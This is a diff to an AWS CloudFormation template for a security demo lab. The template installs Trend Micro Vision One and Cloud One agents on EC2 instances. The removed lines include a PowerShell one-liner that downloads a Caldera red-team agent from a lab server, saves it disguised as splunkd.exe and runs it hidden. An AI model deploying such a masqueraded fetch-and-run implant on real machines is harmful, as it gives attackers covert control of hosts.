@@ -8,15 +8,6 @@ Parameters:
   VisionOneURLLinux:
     Description: VisionOne - Please provide the Agent Installer URL.
     Type: 'String'
-  TenantID:
-    Description: Cloud One - Please provide the Cloud One Workload Security Tenant ID (You can find this information using the C1WS > Deployment Scripts).
-    Type: 'String'
-  Token:
-    Description: Cloud One - Please provide the Cloud One Workload Security Activation Token (You can find this information using the C1WS > Deployment Scripts).
-    Type: 'String'
-  PolicyID:
-    Description: Cloud One - Please provide the Cloud One Workload Security Policy ID used to protect the Windows Instance (You can find this information using the C1WS > Deployment Scripts).
-    Type: 'String'  
   KeyName:
     Description: AWS - Select the Keypar used to create the EC2 Instances.
     Type: AWS::EC2::KeyPair::KeyName
@@ -36,7 +27,13 @@ Parameters:
     Type: 'String'
   WindowsPassword:
     Description: AWS - Please provide the password to be used when accessing the Windows Instances (8 characters including capital case, lower cases and special characters).
-    Type: 'String' 
+    Type: 'String'
+  C1WSWindowsLink:
+    Description: C1WS - Please provide the C1WS Activation Command.
+    Type: 'String'
+  C1WSLinuxLink:
+    Description: C1WS - Please provide the C1WS Activation Command.
+    Type: 'String'    
 Resources:
   VPC1: 
     Type: AWS::EC2::VPC
@@ -206,14 +203,15 @@ Resources:
 
             # Vision One Endpoint Sensor Install
             Invoke-WebRequest -Uri ${VisionOneURLWindows} -OutFile c:\basecamp.exe
+            Start-Sleep -Seconds 60
             Start-Process c:\basecamp.exe
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 60
 
             # Google Chrome Installation
             Invoke-WebRequest 'http://dl.google.com/chrome/install/375.126/chrome_installer.exe' -OutFile c:\chrome.exe
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 30
             Invoke-Expression "c:\chrome.exe /silent /install"
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 30
 
             # Create User
             $Username = "${WindowsUsername}"
@@ -252,28 +250,15 @@ Resources:
 
             #Workload Security Install
             Invoke-WebRequest https://app.deepsecurity.trendmicro.com:443/software/agent/Windows/x86_64/agent.msi -Outfile c:\c1.msi
-            
-            ######################################################################
-            ####### Please make sure you've selected the correct C1 Region #######
-            ######################################################################
-            $ACTIVATIONURL="dsm://agents.workload.trend-us-1.cloudone.trendmicro.com:443/" 
-            ################################# or ################################# 
-            #$ACTIVATIONURL="dsm://agents.deepsecurity.trendmicro.com:443/"
-            ######################################################################
-
-            $TENANTID="tenantID:${TenantID}"
-            $TOKEN="token:${Token}"
-            $POLICY="policyid:${PolicyID}"
-
-            Start-Process "msiexec.exe" -ArgumentList "/i c:\c1.msi /qn ADDLOCAL=ALL /l*v `"$env:LogPath\dsa_install.log`"" -Wait -NoNewWindow
             Start-Sleep -Seconds 120
-            & $Env:ProgramFiles"\Trend Micro\Deep Security Agent\dsa_control" -a $ACTIVATIONURL $TENANTID $TOKEN $POLICY
+            Start-Process msiexec.exe -Wait -ArgumentList '/I c:\c1.msi /quiet'
+            Start-Sleep -Seconds 120
+            
+            ${C1WSWindowsLink}
 
-            # Add Caldera Shortcut
-            New-Item c:\users\default\desktop\caldera.ps1
-            Set-Content 'c:\users\default\desktop\caldera.ps1' '$server="http://$linux_ip"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f; rm -force "C:\Users\Public\splunkd.exe" -ea ignore; [io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null; Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;'  
-     
+            #& $Env:ProgramFiles"\Trend Micro\Deep Security Agent\dsa_control" -a $ACTIVATIONURL $TENANTID $TOKEN $POLICY
             </powershell>
+
   LinuxServerTM:
     Type: 'AWS::EC2::Instance'
     Properties:
@@ -301,23 +286,18 @@ Resources:
             apt-get update -y
             apt-get install wget curl unzip -y
 
-            $TENANTID="tenantID:${TenantID}"
-            $TOKEN="token:${Token}"
-            $POLICY="policyid:${PolicyID}"
+            # C1WS Installation
+            curl https://files.trendmicro.com/products/deepsecurity/en/20.0/Agent-Ubuntu_20.04-20.0.0-5394.x86_64.zip -o agent.zip
+            sleep 15
+            unzip agent.zip -d /temp/
+            sleep 15
+            dpkg -i /temp/Agent-Core-Ubuntu_20.04-20.0.0-5394.x86_64.deb
+            sleep 15
 
-            ######################################################################
-            ####### Please make sure you've selected the correct C1 Region #######
-            ######################################################################
-            $ACTIVATIONURL="dsm://agents.workload.trend-us-1.cloudone.trendmicro.com:443/" 
-            #$ACTIVATIONURL="dsm://agents.deepsecurity.trendmicro.com:443/"
-            ######################################################################
+            ${C1WSLinuxLink}
 
-            wget https://files.trendmicro.com/products/deepsecurity/en/20.0/Agent-Ubuntu_20.04-20.0.0-5394.x86_64.zip -O agent.zip
-            unzip agent.zip
-            dpkg -i Agent-Core-Ubuntu_20.04-20.0.0-5394.x86_64.deb
-            /opt/ds_agent/dsa_control -a $ACTIVATIONURL $TENANTID $TOKEN $POLICY
-
-            wget ${VisionOneURLLinux} -O tmxbc_linux64.tgz
+            # V1 XDR Agent Installation
+            curl ${VisionOneURLLinux} -o tmxbc_linux64.tgz
             tar -xvf tmxbc_linux64.tgz
             ./tmxbc install
 
